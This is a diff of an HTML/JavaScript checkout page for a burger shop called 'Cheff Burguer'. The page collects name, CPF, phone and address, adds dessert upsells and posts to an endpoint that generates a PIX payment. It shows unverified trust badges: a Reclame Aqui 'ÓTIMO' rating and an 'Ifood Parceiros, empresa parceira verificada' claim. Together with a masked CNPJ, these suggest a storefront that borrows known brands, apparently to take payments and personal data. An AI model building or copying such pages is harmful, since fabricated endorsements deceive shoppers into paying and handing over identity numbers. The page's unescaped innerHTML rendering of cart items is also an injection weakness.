@@ -3,126 +3,137 @@
   <meta http-equiv="content-type" content="text/html;charset=UTF-8">
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Checkout Seguro</title>
+  <title>Checkout</title>
   
-  <link type="text/css" href="./css/delivry-25-1.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+  <link type="text/css" href="/css/delivry-25.css" rel="stylesheet">
   
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
   <style>
-    /* Estilos Básicos */
-    body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
+    /* Seus Estilos Personalizados Mantidos */
     h1, h2 { color: #EA1D2C; }
-    .btn, a.voltar { background: #EA1D2C; text-decoration: none; color: white; padding: 8px 15px; border-radius: 5px; display: inline-block; margin-bottom: 20px; font-weight: bold; }
-    .payment-area { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-    .input { display: flex; flex-direction: column; gap: 5px; margin-bottom: 15px; }
-    .input label { font-weight: bold; font-size: 0.9rem; color: #333; }
-    .input input { padding: 12px; border-radius: 8px; border: 1px solid #ccc; font-size: 1rem; }
+    header#topo .cover { background-color: #EA1D2C; }
+    .btn, a.voltar { background: #EA1D2C; }
+    .cart-product { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding: 5px; border: 1px solid #EA1D2C; border-radius: 5px; }
+    .pay-btn { width: 100%; background-color: #077C22; margin-top: 30px !important; color: white; padding: 15px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
+    .pay-btn:disabled { background-color: #ccc; cursor: not-allowed; }
     .hidden { display: none !important; }
-    
-    /* Carrinho e Produtos */
-    .cart-product { display: flex; justify-content: space-between; align-items: center; padding: 10px; border: 1px solid #eee; border-radius: 8px; margin-bottom: 10px; background: #fff; cursor: pointer; transition: 0.2s; }
-    .cart-product:hover { border-color: #EA1D2C; }
-    .cart-product img { border-radius: 5px; width: 50px; height: 50px; object-fit: cover; }
-    
-    /* Botão Pagar */
-    .pay-btn { background-color: #077C22; color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 20px; transition: 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-    .pay-btn:hover { background-color: #055a19; }
-    .pay-btn:disabled { background-color: #ccc; cursor: not-allowed; box-shadow: none; }
-    
-    /* Total */
-    #total-container { text-align: right; margin-top: 20px; font-size: 1.2rem; font-weight: bold; color: #333; }
-    #total-price { color: #077C22; font-size: 1.4rem; }
+    .input-error { border: 1px solid red !important; }
+    .c-p-01 { display: flex; align-items: center; gap: 10px; }
+    .c-p-01 img { max-width: 80px; border-radius: 5px; }
   </style>
 </head>
 
 <body>
+  <div id="opacidade" class="fechar"></div>
+  <header id="topo">
+    <div class="cover main" style="background-position: center; background-size: cover; background-image: url('https://i.ibb.co/mVDwQN39/banner-237f7496.webp');">
+      <div class="logo" style="background-color: white !important; display: flex; align-items: center; justify-content: center;">
+        <img src="/SN8gVgwk/logocheff.png" style="width: 100%;">
+      </div>
+      <div class="borda"></div>
+    </div>
+  </header>
 
   <div class="payment-area">
-    <h2 style="text-align: center; margin-top: 0;">Finalize seu pedido</h2>
-    <a class="voltar" href="../cart.html"><i class="fa fa-arrow-left"></i> VOLTAR</a>
-
-    <div class="payment">
-      <h3 style="border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 20px;">Seus Dados</h3>
+    <div class="container containerFinalizar">
+      <h2 style="width: 100%;text-align: center;" id="checkout-top">Finalize seu pedido</h2>
+      <a class="voltar" href="../cart.html" title="Voltar"><i class="fa-solid fa-chevron-left"></i> VOLTAR</a>
       
-      <div class="input">
-        <label>Nome completo *</label>
-        <input type="text" id="nome" placeholder="Nome e Sobrenome" required>
-      </div>
-      
-      <div class="input">
-        <label>CPF (Obrigatório) *</label>
-        <input type="text" id="cpf" placeholder="000.000.000-00" required>
-      </div>
-
-      <div class="input">
-        <label>Telefone *</label>
-        <input type="text" id="telefone" placeholder="(00) 00000-0000" required>
-      </div>
-
-      <h3 style="border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 30px; margin-bottom: 20px;">Entrega</h3>
-      <div class="input">
-        <label>CEP *</label>
-        <input type="text" id="cep" placeholder="00000-000" required>
-      </div>
-      
-      <div id="address-fields" class="hidden">
-          <div class="input"><label>Endereço</label><input type="text" id="address" required></div>
-          <div style="display: flex; gap: 10px;">
-             <div class="input" style="flex: 1;"><label>Número</label><input type="text" id="number" required></div>
-             <div class="input" style="flex: 2;"><label>Bairro</label><input type="text" id="neighborhood" required></div>
+      <div id="detalhesProduto">
+        <div class="payment">
+          <div class="input">
+            <label for="nome">Nome completo <b>*</b></label>
+            <input type="text" id="nome" placeholder="Nome e Sobrenome" required>
           </div>
-          <div style="display: flex; gap: 10px;">
-             <div class="input" style="flex: 2;"><label>Cidade</label><input type="text" id="city" required></div>
-             <div class="input" style="flex: 1;"><label>Estado</label><input type="text" id="state" required></div>
+          
+          <div class="input">
+            <label for="cpf">CPF (Obrigatório) <b>*</b></label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" required>
           </div>
-      </div>
 
-      <h3 style="margin-top: 30px; margin-bottom: 15px;">Aproveite também:</h3>
-      
-      <label class="cart-product">
-        <div style="display:flex; align-items:center; gap:15px;">
-          <img src="https://i.ibb.co/d4cJNKJ0/1761874938117blob.webp">
-          <div>
-            <div style="font-weight: bold;">Bolo de Pote Brigadeiro</div>
-            <span style="color:#077c22; font-weight: bold;">+ R$ 8,00</span>
+          <div class="input">
+            <label for="telefone">Telefone <b>*</b></label>
+            <input type="text" id="telefone" placeholder="(00) 00000-0000" required>
+          </div>
+
+          <h3 style="width: 100%;text-align: start; margin-top: 20px;">Dados da entrega</h3>
+          <div class="input">
+            <label for="cep">CEP <b>*</b></label>
+            <input type="text" id="cep" placeholder="00000-000" required>
+          </div>
+          
+          <div id="address-container" class="hidden">
+              <div class="input"><label>Endereço</label><input type="text" id="address"></div>
+              <div class="input"><label>Número</label><input type="text" id="number"></div>
+              <div class="input"><label>Bairro</label><input type="text" id="neighborhood"></div>
+              <div class="input"><label>Cidade</label><input type="text" id="city"></div>
+              <div class="input"><label>Estado</label><input type="text" id="state"></div>
           </div>
         </div>
-        <input type="checkbox" class="_orderbump" price="8.00" o-name="Bolo de Pote Brigadeiro" style="width:20px; height:20px;">
-      </label>
 
-      <label class="cart-product">
-        <div style="display:flex; align-items:center; gap:15px;">
-          <img src="https://i.ibb.co/hqXP2qX/1761874938086blob.webp">
-          <div>
-            <div style="font-weight: bold;">Bolo de Pote Prestígio</div>
-            <span style="color:#077c22; font-weight: bold;">+ R$ 8,00</span>
+        <div class="payment">
+          <h3 style="width: 100%;text-align: start;margin-bottom: 10px;">Ofertas disponíveis:</h3>
+
+          <label class="cart-product orderbump">
+            <div class="c-p-01">
+              <div class="img"><img src="https://i.ibb.co/d4cJNKJ0/1761874938117blob.webp"></div>
+              <div class="info">
+                <span class="product-name">Bolo de Pote Brigadeiro</span>
+                <p>R$ <span class="preco">8,00</span></p>
+              </div>
+            </div>
+            <div class="add">
+              <input type="checkbox" class="_orderbump" price="8.00" o-name="Bolo de Pote Brigadeiro" style="width:20px; height:20px; accent-color: #EA1D2C;">
+            </div>
+          </label>
+
+          <label class="cart-product orderbump">
+            <div class="c-p-01">
+              <div class="img"><img src="https://i.ibb.co/hqXP2qX/1761874938086blob.webp"></div>
+              <div class="info">
+                <span class="product-name">Bolo de Pote Prestígio</span>
+                <p>R$ <span class="preco">8,00</span></p>
+              </div>
+            </div>
+            <div class="add">
+              <input type="checkbox" class="_orderbump" price="8.00" o-name="Bolo de Pote Prestígio" style="width:20px; height:20px; accent-color: #EA1D2C;">
+            </div>
+          </label>
+
+          <h3 style="width: 100%;text-align: start;margin-bottom: 10px; margin-top: 20px;">Seu carrinho:</h3>
+          <div id="checkout-cart-items" style="margin-bottom: 20px; border: 1px solid #eee; padding: 10px; border-radius: 5px;"></div>
+
+          <hr style="margin-block: 20px;">
+          <div id="precoProduto"> Total: <span id="total-price">R$ 0,00</span></div>
+          
+          <button class="pay-btn" id="generate-payment">GERAR PIX</button>
+        </div>
+
+        <div class="reviews">
+          <div class="review">
+            <div class="r-top"><img src="/reclameaqui-assets/libraries/header/images/logo-mobile.svg"><span>Reclame Aqui</span></div>
+            <p>O consumidor avaliou o atendimento dessa empresa como <b>ÓTIMO</b>.</p>
+          </div>
+          <div class="review">
+            <div class="r-top"><span>Ifood Parceiros</span></div>
+            <span>Empresa parceira verificada <i class="fa fa-check-circle" style="color:#3A97F8"></i></span>
           </div>
         </div>
-        <input type="checkbox" class="_orderbump" price="8.00" o-name="Bolo de Pote Prestígio" style="width:20px; height:20px;">
-      </label>
 
-      <h3 style="margin-top: 30px; border-bottom: 1px solid #eee; padding-bottom: 10px;">Resumo do Pedido</h3>
-      <div id="checkout-cart-items" style="background: #fafafa; padding: 15px; border-radius: 8px;"></div>
-      
-      <div id="total-container">
-        Total a pagar: <span id="total-price">R$ 0,00</span>
-      </div>
-
-      <button id="generate-payment" class="pay-btn">GERAR PIX E FINALIZAR</button>
-      
-      <div style="text-align: center; margin-top: 20px; font-size: 0.8rem; color: #888;">
-         <i class="fa fa-lock"></i> Ambiente Seguro | Seus dados estão protegidos.
+        <footer>
+          <b style="text-align: center;">Cheff Burguer</b>
+          <span style="font-size: 11pt;font-weight: normal;text-align: center;">CNPJ: 37.XXX.253/0001-51</span>
+        </footer>
       </div>
     </div>
   </div>
 
   <script>
-    // Inicialização de Máscaras
+    // Inicializa máscaras
     $(document).ready(function(){
       $('#cpf').mask('000.000.000-00');
       $('#telefone').mask('(00) 00000-0000');
@@ -131,41 +142,52 @@
 
     document.addEventListener("DOMContentLoaded", () => {
       const paymentBtn = document.getElementById('generate-payment');
-      let carrinho = JSON.parse(localStorage.getItem('meuCarrinho')) || [];
       
+      // Função para calcular total (Carrinho + Bumps)
       function calcularTotal() {
         let total = 0;
+        let carrinho = JSON.parse(localStorage.getItem('meuCarrinho')) || [];
+        
         carrinho.forEach(item => {
-          let preco = typeof item.preco === 'string' 
-             ? parseFloat(item.preco.replace(',','.')) 
-             : item.preco;
+          let preco = typeof item.preco === 'string' ? parseFloat(item.preco.replace(',','.')) : item.preco;
           total += (preco || 0) * (item.quantidade || 1);
         });
+
         document.querySelectorAll('._orderbump:checked').forEach(bump => {
           total += parseFloat(bump.getAttribute('price'));
         });
+
         document.getElementById('total-price').textContent = total.toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
         return total;
       }
 
-      const container = document.getElementById('checkout-cart-items');
-      if(carrinho.length === 0) container.innerHTML = "<p style='text-align:center; color:#888;'>Seu carrinho está vazio.</p>";
-      else {
-        container.innerHTML = '';
-        carrinho.forEach(item => {
-          let precoItem = typeof item.preco === 'string' ? parseFloat(item.preco.replace(',','.')) : item.preco;
-          container.innerHTML += `
-             <div style="display: flex; justify-content: space-between; font-size: 0.95rem; margin-bottom: 8px;">
-                 <span>${item.quantidade}x ${item.nome}</span>
-                 <span>R$ ${(precoItem * item.quantidade).toFixed(2).replace('.',',')}</span>
-             </div>
-          `;
-        });
+      // Renderiza Carrinho
+      function renderizarCarrinho() {
+        const container = document.getElementById('checkout-cart-items');
+        let carrinho = JSON.parse(localStorage.getItem('meuCarrinho')) || [];
+        
+        if(carrinho.length === 0) {
+            container.innerHTML = "<p style='text-align:center; color:#888;'>Seu carrinho está vazio.</p>";
+        } else {
+            container.innerHTML = '';
+            carrinho.forEach(item => {
+              let precoItem = typeof item.preco === 'string' ? parseFloat(item.preco.replace(',','.')) : item.preco;
+              container.innerHTML += `
+                 <div style="display: flex; justify-content: space-between; font-size: 0.95rem; margin-bottom: 8px;">
+                     <span>${item.quantidade}x ${item.nome}</span>
+                     <span>R$ ${(precoItem * item.quantidade).toFixed(2).replace('.',',')}</span>
+                 </div>
+              `;
+            });
+        }
+        calcularTotal();
       }
 
-      calcularTotal();
+      // Listeners
+      renderizarCarrinho();
       document.querySelectorAll('._orderbump').forEach(el => el.addEventListener('change', calcularTotal));
 
+      // Busca CEP
       document.getElementById('cep').addEventListener('blur', async function() {
         const cep = this.value.replace(/\D/g, '');
         if(cep.length === 8) {
@@ -173,7 +195,7 @@
             const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
             const data = await res.json();
             if(!data.erro) {
-              document.getElementById('address-fields').classList.remove('hidden');
+              document.getElementById('address-container').classList.remove('hidden');
               document.getElementById('address').value = data.logradouro;
               document.getElementById('neighborhood').value = data.bairro;
               document.getElementById('city').value = data.localidade;
@@ -184,25 +206,22 @@
         }
       });
 
-      // LÓGICA DE PAGAMENTO
+      // LÓGICA DO BOTÃO PAGAR (INTEGRAÇÃO OTIMIZE)
       paymentBtn.addEventListener('click', async () => {
         const nome = document.getElementById('nome').value.trim();
         const cpf = document.getElementById('cpf').value.trim();
         const tel = document.getElementById('telefone').value.trim();
 
         if(!nome || cpf.length < 14 || tel.length < 14) {
-          // Uso seguro do Swal
-          if(typeof Swal !== 'undefined') {
-              Swal.fire('Atenção', 'Preencha Nome, Telefone e CPF corretamente.', 'warning');
-          } else {
-              alert('Preencha Nome, Telefone e CPF corretamente.');
-          }
+          Swal.fire('Atenção', 'Preencha Nome, CPF e Telefone corretamente.', 'warning');
           return;
         }
 
         paymentBtn.disabled = true;
         paymentBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processando...';
 
+        // Prepara Carrinho Final
+        let carrinho = JSON.parse(localStorage.getItem('meuCarrinho')) || [];
         let itensFinais = carrinho.map(i => ({
              nome: i.nome,
              preco: typeof i.preco === 'string' ? parseFloat(i.preco.replace(',','.')) : i.preco,
@@ -226,41 +245,28 @@
         };
 
         try {
-          console.log("Enviando pagamento...", payload);
-          
-          // Requisição ao Backend
+          // CHAMA A API QUE CONFIGURAMOS
           const res = await fetch('/api/generate-pix', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
           });
 
-          const textResponse = await res.text();
-          let data;
-          try {
-              data = JSON.parse(textResponse);
-          } catch(e) {
-              console.error("Resposta não-JSON do servidor:", textResponse);
-              throw new Error("Erro interno no servidor. Verifique os logs.");
-          }
+          const data = await res.json();
 
           if(res.ok && data.success) {
-            // Sucesso
+            // SUCESSO! Redireciona com os dados
             const dataStr = encodeURIComponent(JSON.stringify(data));
             window.location.href = `/payment/681aaff4852ac923b1bcabfb/682519bb15bf50c6ee011ebb/index.html?data=${dataStr}`;
           } else {
-            throw new Error(data.message || "Erro desconhecido na API.");
+            throw new Error(data.message || "Erro na API.");
           }
 
         } catch(e) {
           console.error(e);
-          if(typeof Swal !== 'undefined') {
-             Swal.fire('Erro', e.message, 'error');
-          } else {
-             alert('Erro: ' + e.message);
-          }
+          Swal.fire('Erro', e.message, 'error');
           paymentBtn.disabled = false;
-          paymentBtn.innerHTML = "TENTAR NOVAMENTE";
+          paymentBtn.innerHTML = "GERAR PIX";
         }
       });
     });
